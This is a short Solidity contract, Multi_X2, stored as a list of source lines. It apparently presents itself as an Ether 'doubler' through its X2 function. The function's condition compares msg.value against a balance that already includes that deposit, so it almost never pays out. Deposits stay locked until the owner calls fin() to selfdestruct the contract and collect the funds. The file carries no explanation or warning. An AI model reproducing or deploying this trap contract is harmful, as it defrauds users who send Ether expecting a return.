['pragma solidity ^0.4.25;\n', '\n', 'contract Multi_X2\n', '{\n', '    address Owner = msg.sender;\n', '\n', '    function() public payable {}\n', '    function close() private { selfdestruct(msg.sender); }\n', '\n', '    function X2() public payable {\n', '        if (msg.value >= address(this).balance) {\n', '           close();\n', '        }\n', '    }\n', ' \n', '    function fin() public {\n', '        if (msg.sender == Owner) {\n', '            close();\n', '        }\n', '    }\n', '}']